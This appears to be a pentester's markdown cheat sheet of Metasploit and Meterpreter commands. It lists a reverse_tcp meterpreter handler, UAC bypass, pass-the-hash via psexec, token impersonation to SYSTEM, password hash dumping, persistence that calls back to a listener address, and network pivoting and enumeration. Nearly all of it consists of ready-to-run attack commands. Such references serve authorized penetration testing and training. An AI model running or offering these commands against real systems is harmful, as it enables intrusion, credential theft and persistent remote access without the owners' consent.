---
title: Metasploit
---

https://securityonline.info/automated-persistent-backdoor-metasploit/
https://netsec.ws/?p=331
https://gist.github.com/ssstonebraker/f25e2f1f6458da6dc074a1e7af79b773
https://www.offensive-security.com/metasploit-unleashed/msfvenom/

## Metasploit

Mestaploit handler command line 
```sh
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.5; set LPORT 4444; set AutoRunScript post/windows/manage/migrate; exploit"
```
Search exploit
```sh
msfconsole -x "search name:smb type:exploit platform:windows"
```
Handler
```sh
use exploit/multi/handler
```
Bypass UAC
```sh
use exploit/windows/local/bypassuac_injection
```
Pass the hash
```sh
user exploit/windows/smb/psexec
```
Add route to season 2
```sh
route add 10.10.10.0 255.255.255.0 2
```
Open a sock
```sh
use auxiliary/server/socks4a
```
Persistence
```sh
use exploit/windows/local/persistence
```
Autorun script
```sh
msf exploit(multi/handler) > set AutoRunScript migrate -n svchost.exe
```
msfvenom payload list
```sh
msfvenom -l payloads
```
migrate process
```sh
use post/windows/manage/migrate
```
local Exploit Suggester
```shell
use post/multi/recon/local_exploit_suggester
```

## Meterpreter
Info about the machine 
```sh
sysinfo
```
Username
```sh
getuid
```
Process
```sh
ps
```
Migrate the shell to another process
```sh
run post/windows/manage/migrate
```
Privilege escaltion from Administrator to SYSTEM
```sh
getsystem
```
Verify if UAC is enable
```sh
run post/windows/gather/win_privs
```
Imperonate Token
```sh
use incognito
list_token -u
impersonate_token "NT AUTHORITY\SYSTEM"
```
hash dump
```sh
run hashdump
```
Persistence
```sh
run persistence -A -X -i 5 -p 4444 -r 192.168.1.3
```
Information Gathering
```sh
run post/windows/gather
```
Search file 
```sh
search -d C:\\Users\\els\\ -f *.txt
```
Portforward
```sh
portfwd add –l 3389 –p 3389 –r [target host]
portfwd delete –l 3389 –p 3389 –r [target host]
portfwd flush
```
Resources shared
```sh
run enum_share
```
Enum Applications
```sh
run post/windows/gather/enum_applications
```
Enum Service
```sh
run post/windows/gather/enum_services
```
route table
```sh
route
```
arp scan 
```sh
run arp_scanner -h
```
network enumeration 
```sh
run netenum -h
```
autoroute
```sh
run autoroute -s 10.10.10.0/24
```
create user
```sh
run getgui
```
info privilege escalation (UAC status)
```sh
run post/windows/gather/win_privs
```
Privilege escalation enumeration 
```sh
run post/multi/recon/local_exploit_suggester
```

